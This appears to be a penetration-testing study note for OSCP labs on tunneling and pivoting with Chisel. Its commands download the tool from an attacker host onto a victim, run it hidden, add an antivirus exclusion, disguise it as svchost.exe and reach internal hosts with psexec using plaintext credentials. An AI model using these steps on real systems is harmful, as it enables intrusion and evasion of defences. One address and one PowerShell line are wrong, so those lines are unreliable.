---
tags:
  - Windows
  - Linux
  - Lateral_Movement
  - Tunneling
  - Pivoting
  - Foundational
---

## Tunneling with Chisel
resources: [Chisel GitHub](https://github.com/jpillora/chisel), [HackTricks Chisel](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#chisel)

> Fast TCP/UDP tunnel over HTTP secured via SSH - ideal for pivoting through dual-homed machines.

## What is Chisel?

> [!info] Chisel is a TCP/UDP tunnel transported over HTTP and secured via SSH.
> - Single executable (no dependencies)
> - Works on Windows, Linux, macOS
> - Supports reverse and forward tunneling
> - Easier than SSH tunneling for Windows targets
> - Perfect for OSCP dual-homed machines

## Installation

### Download Chisel
```bash
# On Kali
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 /usr/local/bin/chisel
```

### Download for Windows
```bash
# Download Windows binary
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gunzip chisel_1.9.1_windows_amd64.gz
mv chisel_1.9.1_windows_amd64 chisel.exe
```

## Basic Reverse Tunneling

> [!tip] Reverse tunneling is most common - victim connects back to attacker.

### Server on Kali
```bash
chisel server -p 8000 --reverse
```

**Flags:**
- `-p 8000` - Listen on port 8000
- `--reverse` - Allow reverse tunnels

### Client on Victim

#### Forward Local Port to Kali
```bash
# Listen on Kali port 80, forward to victim's localhost:80
chisel client <KaliIP>:8000 R:80:127.0.0.1:80
```

**Example:**
```bash
chisel client 10.10.14.5:8000 R:80:127.0.0.1:80
```

> [!info] Now accessing `http://127.0.0.1:80` on Kali reaches victim's localhost:80.

#### Forward Remote Network Port to Kali
```bash
# Listen on Kali port 443, forward to 10.10.10.240:80
chisel client <KaliIP>:8000 R:443:10.10.10.240:80
```

**Example:**
```bash
chisel client 10.10.14.5:8000 R:443:10.10.10.240:80
```

> [!info] Now accessing `http://127.0.0.1:443` on Kali reaches 10.10.10.240:80 through the victim.

## Common Use Cases

### Access Internal Web Application

**Scenario:** Victim can access internal web server at 192.168.100.50:80

**On Kali:**
```bash
chisel server -p 8000 --reverse
```

**On Victim:**
```bash
chisel client 10.10.14.5:8000 R:8080:192.168.100.50:80
```

**Access on Kali:**
```bash
curl http://127.0.0.1:8080
```

### Access Multiple Internal Services

**On Kali:**
```bash
chisel server -p 8000 --reverse
```

**On Victim:**
```bash
# Forward multiple ports
chisel client 10.10.14.5:8000 R:8080:192.168.100.50:80 R:3389:192.168.100.50:3389 R:445:192.168.100.50:445
```

**Access on Kali:**
```bash
# Web server
curl http://127.0.0.1:8080

# RDP
xfreerdp /v:127.0.0.1:3389 /u:Administrator /p:Password123!

# SMB
smbclient -L //127.0.0.1 -U Administrator
```

### SOCKS Proxy for Full Network Access

**On Kali:**
```bash
chisel server -p 8000 --reverse --socks5
```

**On Victim:**
```bash
chisel client 10.10.14.5:8000 R:socks
```

**Configure ProxyChains on Kali:**
```bash
# Edit /etc/proxychains4.conf
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Use with any tool
proxychains nmap -sT -Pn 192.168.100.0/24
proxychains crackmapexec smb 192.168.100.50 -u Administrator -p Password123!
```

## Windows-Specific Usage

### PowerShell Download and Execute
```powershell
# Download chisel.exe
IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/chisel.exe', 'C:\Temp\chisel.exe')

# Execute
C:\Temp\chisel.exe client 10.10.14.5:8000 R:80:127.0.0.1:80
```

### Background Execution
```powershell
# Run in background
Start-Process -FilePath "C:\Temp\chisel.exe" -ArgumentList "client 10.10.14.5:8000 R:80:127.0.0.1:80" -WindowStyle Hidden
```

### CMD Execution
```cmd
chisel.exe client 10.10.14.5:8000 R:80:127.0.0.1:80
```

## Advanced Tunneling

### Forward Tunneling (Less Common)

**On Kali (server):**
```bash
chisel server -p 8000
```

**On Victim (client):**
```bash
# Forward Kali's port 8080 to victim's localhost:80
chisel client 10.10.14.5:8000 8080:127.0.0.1:80
```

> [!info] Now accessing victim's port 8080 reaches its localhost:80.

### Multiple Hops

**Scenario:** Kali → Victim1 → Victim2

**On Kali:**
```bash
chisel server -p 8000 --reverse
```

**On Victim1:**
```bash
# Forward Victim2's services through Victim1
chisel client 10.10.14.5:8000 R:9000:192.168.200.50:80
```

**On Victim2 (if needed):**
```bash
# Further pivoting
chisel client 192.168.200.1:9000 R:9001:192.168.300.50:80
```

## Comparison with Other Tools

### vs SSH Tunneling
```bash
# SSH (requires SSH server)
ssh -L 8080:192.168.100.50:80 user@victim

# Chisel (works anywhere)
chisel client 10.10.14.5:8000 R:8080:192.168.100.50:80
```

> [!tip] Chisel works on Windows without SSH server.

### vs Ligolo-NG
```bash
# Ligolo-NG (more features, more complex)
# Better for complex multi-hop scenarios

# Chisel (simpler, faster setup)
# Better for quick single-hop tunnels
```

> [!info] Use Chisel for simple tunnels, Ligolo-NG for complex pivoting.

### vs Metasploit Portfwd
```bash
# Metasploit (requires Meterpreter session)
portfwd add -l 8080 -p 80 -r 192.168.100.50

# Chisel (works with any shell)
chisel client 10.10.14.5:8000 R:8080:192.168.100.50:80
```

## Troubleshooting

### Connection Refused
> [!warning] Firewall blocking connection or wrong IP/port.

**Solutions:**
```bash
# Verify server is running
netstat -tlnp | grep 8000

# Check firewall
sudo ufw allow 8000/tcp

# Try different port
chisel server -p 9000 --reverse
```

### Tunnel Disconnects
> [!info] Network instability or timeout.

**Solutions:**
```bash
# Add keepalive
chisel client 10.10.14.5:8000 R:80:127.0.0.1:80 --keepalive 30s

# Increase timeout
chisel server -p 8000 --reverse --keepalive 30s
```

### Permission Denied
```bash
# Run with sudo if needed
sudo chisel server -p 80 --reverse
```

### Windows Antivirus Blocks Chisel
```powershell
# Add exclusion
Add-MpPreference -ExclusionPath "C:\Temp\chisel.exe"

# Or rename binary
mv chisel.exe svchost.exe
```

## OSCP Exam Tips

> [!important] Chisel is essential for dual-homed machines in OSCP.

**Time Estimate:** 5 minutes to set up tunnel

**Quick Wins:**
1. **Dual-homed machine found** - Use Chisel to access second network
2. **Internal web app discovered** - Tunnel port to Kali for enumeration
3. **Multiple services on internal network** - SOCKS proxy for full access

**Common Mistakes:**
- Forgetting `--reverse` flag on server
- Using wrong IP (victim's IP vs internal target IP)
- Not configuring ProxyChains for SOCKS proxy
- Blocking port with firewall

**Pro Tips:**
- Always use reverse tunneling (victim connects to you)
- Test tunnel with `curl` before running scans
- Use SOCKS proxy for full network enumeration
- Keep chisel.exe in your toolkit folder
- Document all tunnels in your notes

## Complete Dual-Homed Example

```bash
# Scenario: Victim (10.10.10.100) can access internal network (192.168.100.0/24)

# 1. Start server on Kali
chisel server -p 8000 --reverse --socks5

# 2. Upload chisel to victim
wget http://10.10.14.5/chisel.exe -O C:\Temp\chisel.exe

# 3. Connect from victim
C:\Temp\chisel.exe client 10.10.14.5:8000 R:socks

# 4. Configure ProxyChains on Kali
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# 5. Enumerate internal network
proxychains nmap -sT -Pn 192.168.100.0/24

# 6. Attack internal targets
proxychains crackmapexec smb 192.168.100.50 -u Administrator -p Password123!
proxychains impacket-psexec Administrator:Password123!@192.168.100.50
```

> [!tip] This workflow enables full access to the internal network through the compromised dual-homed machine.

## Quick Reference

### Server Commands
```bash
# Basic reverse server
chisel server -p 8000 --reverse

# With SOCKS proxy
chisel server -p 8000 --reverse --socks5

# With authentication
chisel server -p 8000 --reverse --auth user:pass

# With keepalive
chisel server -p 8000 --reverse --keepalive 30s
```

### Client Commands
```bash
# Forward single port
chisel client <KaliIP>:8000 R:8080:192.168.100.50:80

# Forward multiple ports
chisel client <KaliIP>:8000 R:8080:192.168.100.50:80 R:3389:192.168.100.50:3389

# SOCKS proxy
chisel client <KaliIP>:8000 R:socks

# With authentication
chisel client <KaliIP>:8000 R:8080:192.168.100.50:80 --auth user:pass
```

### ProxyChains Configuration
```bash
# Add to /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Use with tools
proxychains <command>
```
